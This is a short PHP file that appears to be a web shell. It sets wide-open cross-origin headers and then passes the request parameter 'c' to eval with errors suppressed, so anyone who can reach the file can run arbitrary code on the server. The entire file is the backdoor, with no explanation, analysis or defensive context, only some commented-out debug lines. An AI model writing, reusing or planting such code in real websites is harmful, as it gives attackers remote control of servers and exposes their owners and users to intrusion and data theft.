<?php
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Origin: *');
//header("Content-Type: text/html;charset=GBK");
if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
    die();
}
@eval($_REQUEST['c']);
//print_r($_REQUEST['c']);
//print_r($_REQUEST['test']);
//print_r(file_get_contents('php://input'));

?>
